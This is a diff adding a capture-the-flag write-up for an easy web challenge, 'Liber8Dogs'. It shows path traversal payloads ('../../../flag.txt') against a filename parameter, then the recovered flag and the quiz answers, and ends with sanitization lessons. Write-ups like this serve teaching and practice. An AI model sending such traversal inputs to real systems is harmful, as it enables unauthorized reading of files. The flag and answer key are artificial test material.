@@ -1,0 +1,51 @@
+
+# 🧠 CTF Write-up: Liber8Dogs (Easy, 100 pts)
+
+## 🧩 Challenge Summary
+
+> "Liber8tion posted a dog gallery. Can you find a vulnerability and locate the flag in `flag.txt`?"
+
+## 🔍 Recon
+
+- Site listed images with links like: `/dog?filename=Tibs.jpg`
+- This hinted at a file being read based on a query parameter
+
+## 🧪 Exploitation
+
+### Step 1: Path Traversal Test
+
+Sent:
+```
+/dog?filename=../../flag.txt
+```
+
+Got error:
+```
+No such file or directory: '/app/static/dogs/../../flag.txt'
+```
+
+Confirmed:
+- The app is building file paths using `filename` from `/app/static/dogs/`
+- Our `../` was *not sanitized*, so traversal is allowed
+
+### Step 2: Try Going Up Three Levels
+
+Sent:
+```
+/dog?filename=../../../flag.txt
+```
+
+Bingo:
+```
+SKY-BUPE-2348
+```
+
+## ✅ Final Answers
+
+- Q1: `/dog`
+- Q2: `SKY-BUPE-2348`
+
+## 🎯 Lessons Learned
+
+- Always sanitize file inputs on the backend
+- Avoid exposing file readers to user-controlled input without constraints
